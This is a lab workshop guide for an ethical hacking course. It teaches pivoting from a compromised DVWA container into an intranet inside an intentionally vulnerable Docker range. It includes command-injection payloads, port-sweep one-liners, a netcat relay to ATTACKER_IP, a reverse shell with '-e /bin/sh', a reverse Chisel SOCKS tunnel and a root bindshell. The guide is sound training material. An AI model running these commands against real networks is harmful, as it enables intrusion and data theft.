# Pivoting & Lateral Movement in the CyberRange

# Warning
This workshop is for educational purposes only, as part of WOCSA ethical hacking workshops. All techniques described here target the intentionally vulnerable CyberRange environment. Never use them against systems you do not own or do not have explicit written permission to test.

# Table of Contents
- [Pivoting & Lateral Movement in the CyberRange](#pivoting--lateral-movement-in-the-cyberrange)
- [Warning](#warning)
- [Table of Contents](#table-of-contents)
- [Introduction](#introduction)
- [Prerequisites](#prerequisites)
- [Lab topology recap](#lab-topology-recap)
- [Phase 1 - Foothold on DVWA](#phase-1---foothold-on-dvwa)
- [Phase 2 - Enumeration from the foothold](#phase-2---enumeration-from-the-foothold)
- [Phase 3 - Pivoting techniques](#phase-3---pivoting-techniques)
  - [Pivot 1: HTTP relay via DVWA (curl only)](#pivot-1-http-relay-via-dvwa-curl-only)
  - [Pivot 2: Reverse shell relayed through DVWA with netcat](#pivot-2-reverse-shell-relayed-through-dvwa-with-netcat)
  - [Pivot 3: Full dynamic SOCKS pivot](#pivot-3-full-dynamic-socks-pivot)
  - [Pivot 4: Mint your own VPN peer (become an employee)](#pivot-4-mint-your-own-vpn-peer-become-an-employee)
- [Phase 4 - Lateral movement goals](#phase-4---lateral-movement-goals)
- [Defense & detection](#defense--detection)
- [Takeaways checklist](#takeaways-checklist)
- [Resources](#resources)
- [Summary report](#summary-report)

# Introduction
Pivoting is the art of using a compromised machine as a stepping stone to reach networks that are not directly accessible from your attacker position. It sits right in the middle of the kill chain: after **initial foothold** and before **lateral movement / actions on objectives**. In a segmented enterprise, the web server you pwned almost never holds the crown jewels - but it is often the only machine with a foot in both the DMZ and the internal network.

The canonical story of the CyberRange is exactly that: **pwn DVWA from the outside -> pivot to the intranet -> own metasploitable2 / the workstations -> read the company mail**. Every other DMZ service stops at the DMZ boundary (Docker drops inter-bridge traffic), which is what a properly segmented network should do. DVWA, with its extra "misconfigured" network leg, fails to do it - and that makes it the star of this workshop.

# Prerequisites
- The CyberRange running: `cd CyberRange && docker compose up -d` (profiles `dmz` + `intranet` + `vpn`; profile options are documented in `CyberRange/README.md`).
- DVWA reachable at `http://localhost:8081`.
- A machine to attack from: your own laptop or a separate lab attacker VM with `curl`, OpenBSD `nc` and Python 3. There is no attacker service in this Compose file.
- A VPN peer for yourself (optional - it is the "legitimate" way in, useful to compare with the attack paths below): admin UI at `http://localhost:51821`, credentials in `CyberRange/.env`.

## Instructor setup and repeatable checks

Allow about 90 minutes: setup/foothold 20, enumeration 15, relays/SOCKS 35, defense and cleanup 20. Disconnect the participant VPN for the pivot exercises. A Linux Docker host can often reach bridge addresses directly; use a separate participant laptop/VM with no intranet route to demonstrate isolation. Docker Desktop normally does not expose bridge IPs directly.

From the repository root, start only the core targets (DVWA's database starts as a dependency):
```bash
docker compose --env-file CyberRange/.env.example -f CyberRange/docker-compose.yml up -d corporate-site dvwa intranet-wiki metasploitable2
# Confirm DVWA is tri-homed (all three legs appear):
docker inspect cyberrange-dvwa | grep -E "10\.5\.(10|15|20)\."
# Confirm DVWA reaches the intranet wiki, and a DMZ-only box does not:
docker exec cyberrange-dvwa curl -s -o /dev/null -w "dvwa->wiki=%{http_code}\n" --max-time 5 http://10.5.20.10/
docker exec cyberrange-corporate-site wget -qO- --timeout=2 http://10.5.20.10/ ; echo "dmz-only exit=$? (non-zero = isolated, expected)"
```
The sample environment suffices for the local core lab. For shared hosting, copy it to `CyberRange/.env`, configure the bind address and credentials, and use that file instead. Older target images may require amd64 emulation on ARM hosts. Wait for services to finish booting before testing. Initialize DVWA through `/setup.php`; do not reset a shared database without coordinating with the class.

These checks use Docker operator access and are bounded and non-destructive: they verify the core topology and HTTP/TCP access, not completion of the interactive exercises. Optional VPN, monitoring, mail and desktop goals require those services to be started separately.

Stop only these workshop services when finished (preserves data):
```bash
docker compose --env-file CyberRange/.env.example -f CyberRange/docker-compose.yml stop corporate-site dvwa dvwa-db intranet-wiki metasploitable2
```

# Lab topology recap
The range is split into three Docker networks. DVWA is the **only** service with a leg in all three.

| Zone | Subnet | Hosts | Reachability |
|---|---|---|---|
| DMZ | `10.5.10.0/24` | corporate-site `.10`, juice-shop `.11`, dvwa `.12`, mailpit `.13` | published on `localhost` ports, no VPN needed |
| DB tier | `10.5.15.0/24` | dvwa-db `.10`, dvwa `.20` | DVWA only (dvwa-db:3306) |
| Intranet | `10.5.20.0/24` | wg-easy `.2`, dokuwiki `.10`, sftpgo `.11`, metasploitable2 `.12`, grafana `.14`, prometheus `.15`, blackbox `.16`, dvwa `.20`, workstations `.21`/`.22` | VPN only - except for DVWA's third leg |

Expected reachability (verify against your running images with the checks in the setup section above):
- A DMZ-only service (juice-shop, corporate-site, mailpit) **cannot** reach `10.5.20.x` or `10.5.15.x`.
- DVWA **can** reach the whole intranet: `10.5.20.10` (HTTP 200), `10.5.20.12` (many open ports), `10.5.20.2:51821` (401 unauth = reachable).
- Check installed tools first: `docker exec cyberrange-dvwa sh -c 'command -v nc; command -v curl; command -v python3; command -v php'`. PHP is sufficient for enumeration; Python and netcat availability depends on the image.
- Two documented exceptions worth knowing (see `CyberRange/README.md`): blackbox-exporter is dual-homed (`10.5.10.20:9115`, abusable `/probe` endpoint). Grafana provisions a wg-easy authorization header in `secureJsonData`; this is not a plaintext credential disclosure through its UI. Mailpit has no authentication configured here.

# Phase 1 - Foothold on DVWA
1. Open `http://localhost:8081` and log in with `admin` / `password`.
2. On a **first run** (fresh `docker compose down -v` or new dvwa-db), the login redirects to `/setup.php`: click **"Create / Reset Database"** once, then log in again.
3. `DVWA_SECURITY_LEVEL=low` is the default - keep it for this workshop.
4. To get a real command shell on DVWA (instead of `docker exec`, which is fine too while you are the lab operator), use the **Command Injection** module at low security:
   ```
   127.0.0.1; id
   127.0.0.1; hostname -I
   ```
   Or upload a simple PHP webshell through the **File Upload** module and call it from `/hackable/uploads/`.
5. For the rest of the workshop you can simulate the pwned shell with:
   ```bash
   docker exec -it cyberrange-dvwa sh
   ```

# Phase 2 - Enumeration from the foothold
First, prove DVWA is tri-homed. From the host:
```bash
docker inspect cyberrange-dvwa | grep -E "10\.5\.(10|15|20)\."
```
You should see all three legs: `10.5.10.12` (DMZ), `10.5.15.20` (db-tier), `10.5.20.20` (intranet). From inside the container, `hostname -I` confirms it too.

There is no `nmap`/`arp-scan` inside DVWA, but `php` and `python3` are. Find live hosts on `10.5.20.0/24` by testing port 80:

PHP one-liner (works straight from the DVWA webshell):
```bash
php -r 'for($i=1;$i<255;$i++){ $f=@fsockopen("10.5.20.$i",80,$e,$s,0.1); if($f){ echo "10.5.20.$i port 80 OPEN\n"; fclose($f);} }'
```

Python3 alternative (inside `docker exec cyberrange-dvwa sh`):
```bash
python3 -c "
import socket
for i in range(1,255):
    ip = '10.5.20.%d' % i
    s = socket.socket(); s.settimeout(0.2)
    if s.connect_ex((ip,80)) == 0: print(ip, '80 open')
    s.close()
"
```
Expect at least `.10` (dokuwiki), `.12` (metasploitable2 Apache) and `.20` (yourself). Then probe a few known ports (`.2:51821`, `.11:8080`, `.12` full sweep with a port list, `.14:3000`) the same way.

# Phase 3 - Pivoting techniques

## Pivot 1: HTTP relay via DVWA (curl only)
The simplest pivot: run `curl` on the pwned box. No special tooling, just a command channel (docker exec, webshell, or the Command Injection module with `; curl ...`).

```bash
# Wiki (dokuwiki) - first run shows the install wizard
docker exec cyberrange-dvwa curl -s -I http://10.5.20.10/
docker exec cyberrange-dvwa curl -s http://10.5.20.10/install.php | head -20

# Metasploitable2 web roots
docker exec cyberrange-dvwa curl -s -I http://10.5.20.12/
docker exec cyberrange-dvwa curl -s -I http://10.5.20.12:8180/

# wg-easy admin UI is reachable (401 = alive, needs auth)
docker exec cyberrange-dvwa curl -s -o /dev/null -w "%{http_code}\n" http://10.5.20.2:51821/

# sftpgo web UI
docker exec cyberrange-dvwa curl -s -o /dev/null -w "%{http_code}\n" http://10.5.20.11:8080/
```
Notes:
- `10.5.20.10/install.php` means the wiki has never been configured: run the wizard (through the VPN, or from DVWA's curl by replaying the POSTs) and it becomes an internal knowledge base - a goldmine of employee notes.
- This pivot is "static": every request is one curl invocation. Fine for enumeration and data theft, useless for interactive shells. The next pivots solve that.

## Pivot 2: Reverse shell relayed through DVWA with netcat
Metasploitable2 has no published ports. Use tri-homed DVWA as the middle box. Docker bridge segmentation does not necessarily block outbound connections to your laptop: test that separately, rather than assuming there is no route.

Use three terminals. Commands below use OpenBSD netcat syntax; the host listener on macOS also accepts `nc -l 4445`.

1. On your laptop, listen with `nc -l 4445`.
2. On DVWA, run a bidirectional FIFO relay. Replace `ATTACKER_IP` with your host's LAN IP or `host.docker.internal` on Docker Desktop:
   ```bash
   docker exec -it cyberrange-dvwa sh -c '
     d=$(mktemp -d)
     trap "rm -rf $d" EXIT
     mkfifo "$d/pipe"
     nc -l 4444 <"$d/pipe" | nc ATTACKER_IP 4445 >"$d/pipe"
   '
   ```
3. For a reproducible operator-assisted bootstrap, run:
   ```bash
   docker exec cyberrange-metasploitable2 nc 10.5.20.20 4444 -e /bin/sh
   ```
4. Type `id` in the laptop listener. Expect `uid=0(root)`. Type `exit` and stop any remaining relay/listener processes with Ctrl-C.

The operator bootstrap is a simulation of prior code execution on the internal host; it is not evidence of exploitation. A simple `nc ... | nc ...` pipe only forwards one direction and cannot carry an interactive shell. DVWA's OpenBSD netcat has no `-e`; the traditional netcat in Metasploitable2 does.

## Pivot 3: Full dynamic SOCKS pivot
A reverse SOCKS tunnel lets laptop TCP clients reach internal services through DVWA without a VPN. Obtain matching [Chisel release binaries](https://github.com/jpillora/chisel/releases) for your laptop OS/CPU and DVWA's Linux CPU (`docker exec cyberrange-dvwa uname -m`). Unpack them before the session; an amd64 container needs the linux_amd64 binary even on an ARM laptop. Name the laptop binary `chisel` and the Linux binary `chisel-linux`.

On the laptop, start the server (allow TCP 8082 through the lab host firewall):
```bash
chmod +x ./chisel
./chisel server --reverse --port 8082 --auth workshop:lab-only
```
In another terminal, stage the client as the operator, then run it as the web account. Replace `ATTACKER_IP` as above:
```bash
docker cp ./chisel-linux cyberrange-dvwa:/tmp/chisel
docker exec cyberrange-dvwa chmod 755 /tmp/chisel
docker exec -it --user www-data cyberrange-dvwa /tmp/chisel client \
  --auth workshop:lab-only http://ATTACKER_IP:8082 R:127.0.0.1:1080:socks
```
On the laptop:
```bash
curl --noproxy '' --socks5-hostname 127.0.0.1:1080 --max-time 10 http://10.5.20.10/
```
Expect the wiki HTML or an installation redirect. Configure the browser for SOCKS5 `127.0.0.1:1080` to explore the internal web services. For proxychains, explicitly configure `socks5 127.0.0.1 1080`; a bounded scan is `proxychains4 nmap -sT -Pn -n -p 80,22 10.5.20.12`. SOCKS does not carry nmap raw SYN scans or ICMP discovery. Stop the client/server after the exercise and remove `/tmp/chisel`.

SSH `-D` is an alternative only after the SSH endpoint is reachable. Direct `ssh -D ... 10.5.20.12` from an isolated laptop cannot establish the first pivot. SFTPGo is a file transfer service, not a general SSH shell/tunneling server.

## Pivot 4: Mint your own VPN peer (become an employee)
This is an optional instructor-assisted comparison, not a required exploitation step. Start the VPN service separately, use an instructor-issued admin credential, and browse `http://10.5.20.2:51821` through the SOCKS browser. Log in, create a temporary `pivot-proof` peer, download its configuration, then activate it in WireGuard. The VPN endpoint must point to the reachable lab server and its UDP port must be accessible. Confirm intranet access, disconnect, then delete the temporary peer and local configuration.

Do not assume wg-easy v15 accepts Basic authentication on `/api/client`, or that Grafana reveals its encrypted `secureJsonData` values. Use the deployed version's UI and verify its API before automating it. Reading `CyberRange/.env` as the operator is an assisted credential handoff, not an attacker discovery. The sample environment has a known training password; change it for a shared session.

# Phase 4 - Lateral movement goals
Choose your own adventure, all from the pivoted position:
- **Own metasploitable2** (`10.5.20.12`): `msfadmin` / `msfadmin` over SSH or telnet; or the famous root bindshell on port `1524`:
  ```bash
  docker exec cyberrange-dvwa sh -c 'printf "id\nexit\n" | nc -w 3 10.5.20.12 1524'
  ```
  Then enumerate its many services (21, 22, 23, 25, 111, 139, 445, 512-514, 1099, 2121, 3306, 3632, 5432, 6667, 6697, 8009, 8180, 8787) for more practice.
- **Inspect the optional workstations** through the SOCKS browser (`https://10.5.20.21:3001`, `https://10.5.20.22:3001`). These use self-signed certificates. The Compose configuration does not set desktop credentials; VPN credentials are not desktop credentials.
- **Read the company mail** (mailpit, reachable from DVWA on the DMZ leg):
  ```bash
  docker exec cyberrange-dvwa curl -s http://10.5.10.13:8025/api/v1/messages
  docker exec cyberrange-dvwa curl -s 'http://10.5.10.13:8025/api/v1/message/REPLACE_WITH_ID/raw'
  ```

# Defense & detection
- **Verify segmentation against listening services**: pair each negative check (from a DMZ-only box) with a successful check from DVWA. For a manual wiki check:
  ```bash
  docker exec cyberrange-corporate-site wget -qO- --timeout=2 http://10.5.20.10/ ; echo "exit=$?"
  ```
  This should fail while the wiki HTTP request from DVWA succeeds. Test the database on TCP 3306, not HTTP port 80 (which is closed even without isolation). This is the single most important lesson: DVWA is reachable *because* someone gave it three legs.
- **Least privilege network legs**: DMZ apps need a DMZ leg, not an intranet one. Databases need a private tier reachable only by their application. Review every container's networks like a firewall rule.
- **Detection limits**: the bundled Prometheus/blackbox dashboards show service health, not connection histories or peer-creation audit events. To investigate a pivot, collect application logs and packet captures on the relevant interfaces. Record source/destination addresses and timestamps during the exercise.
- **Patch and segment DVWA**: it is intentionally vulnerable (low security level, command injection, file upload) - in production it should be patched, hardened, and, above all, stripped of its intranet leg.

# Takeaways checklist
- [ ] Logged into DVWA at `localhost:8081` (`admin`/`password`), ran setup.php on first boot
- [ ] Confirmed DVWA's three legs with `docker inspect`
- [ ] Enumerated `10.5.20.0/24` from DVWA with the php/python3 port-80 sweep
- [ ] Reached the wiki (`10.5.20.10`), metasploitable2 (`10.5.20.12`) and wg-easy (`10.5.20.2:51821`) through the curl relay
- [ ] Caught a metasploitable2 root shell through the DVWA nc relay
- [ ] Set up a reverse Chisel SOCKS pivot on DVWA and browsed the intranet with `proxychains`
- [ ] Optionally created and deleted a WireGuard peer through the UI with instructor credentials
- [ ] Verified that a DMZ-only container cannot reach the intranet
- [ ] Read company mail through the mailpit API

# Resources
- [wg-easy documentation & API](https://github.com/wg-easy/wg-easy)
- [CyberRange README (topology, profiles, isolation rules)](../../CyberRange/README.md)
- [PayloadsAllTheThings - Network Pivoting Techniques](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Network%20Pivoting%20Techniques.md)
- [Chisel (fast TCP/UDP tunnel over HTTP)](https://github.com/jpillora/chisel)
- [proxychains](https://github.com/haad/proxychains)
- [Metasploitable2 guide](https://docs.rapid7.com/metasploitable/)

# Summary report
Record what you actually verified: image versions, attacker location, foothold identity, reachable ports, a command/response through the relay, a SOCKS HTTP response, and positive/negative isolation checks. Distinguish operator-assisted steps from exploitation. Record optional exercises skipped and remove temporary binaries, listeners and VPN peers.
